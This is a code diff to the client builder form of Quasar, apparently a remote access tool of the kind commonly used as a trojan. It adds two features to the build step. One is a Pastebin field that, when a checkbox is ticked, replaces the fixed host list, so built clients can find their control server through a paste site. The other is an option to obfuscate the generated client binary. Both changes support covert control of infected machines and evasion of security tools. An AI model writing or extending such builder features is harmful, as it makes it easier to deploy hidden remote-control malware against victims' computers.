@@ -1,4 +1,4 @@
-﻿using Quasar.Common.DNS;
+using Quasar.Common.DNS;
 using Quasar.Common.Helpers;
 using Quasar.Server.Build;
 using Quasar.Server.Forms.DarkMode;
@@ -20,6 +20,7 @@ namespace Quasar.Server.Forms
         private bool _profileLoaded;
         private bool _changed;
         private readonly BindingList<Host> _hosts = new BindingList<Host>();
+
         private readonly HostsConverter _hostsConverter = new HostsConverter();
         private Label lblPortNotification;
         private System.Windows.Forms.Timer portNotificationTimer;
@@ -205,6 +206,7 @@ namespace Quasar.Server.Forms
             profile.Hosts = _hostsConverter.ListToRawHosts(_hosts);
             profile.Delay = (int)numericUpDownDelay.Value;
             profile.Mutex = txtMutex.Text;
+            profile.Pastebin = txtPastebin.Text;
             profile.InstallClient = chkInstall.Checked;
             profile.InstallName = txtInstallName.Text;
             profile.InstallPath = GetInstallPath();
@@ -394,14 +396,27 @@ namespace Quasar.Server.Forms
         private BuildOptions GetBuildOptions()
         {
             BuildOptions options = new BuildOptions();
-            if (!CheckForEmptyInput())
+            if (!CheckForEmptyInput() && !checkBox1.Checked)
             {
                 throw new Exception("Please fill out all required fields!");
             }
 
             options.Tag = txtTag.Text;
             options.Mutex = txtMutex.Text;
-            options.RawHosts = _hostsConverter.ListToRawHosts(_hosts);
+            if (checkBox1.Checked)
+            {
+                options.RawHosts = txtPastebin.Text;
+                options.Pastebin = txtPastebin.Text;
+            }
+            else
+            {
+                options.Pastebin = "";
+                options.RawHosts = _hostsConverter.ListToRawHosts(_hosts);
+            }
+                
+                
+
+            
             options.Delay = (int)numericUpDownDelay.Value;
             options.IconPath = txtIconPath.Text;
             options.Version = Application.ProductVersion;
@@ -424,7 +439,7 @@ namespace Quasar.Server.Forms
                 throw new Exception("Could not locate \"client.bin\" file. It should be in the same directory as Quasar.");
             }
 
-            if (options.RawHosts.Length < 2)
+            if (options.RawHosts.Length < 2 && !checkBox1.Checked)
             {
                 throw new Exception("Please enter a valid host to connect to.");
             }
@@ -525,7 +540,8 @@ namespace Quasar.Server.Forms
 
                 var builder = new ClientBuilder(options, "client.bin");
 
-                builder.Build();
+                bool obfuscate = chkObfuscateOutput.Checked;
+                builder.Build(obfuscate);
 
                 try
                 {
@@ -671,6 +687,26 @@ namespace Quasar.Server.Forms
             HasChanged();
 
             RefreshPreviewPath();
+        }
+
+        private void txtHost_TextChanged_1(object sender, EventArgs e)
+        {
+
+        }
+
+        private void builderTabs_SelectedIndexChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void connectionPage_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void txtPastebin_TextChanged(object sender, EventArgs e)
+        {
+
         }
     }
 }
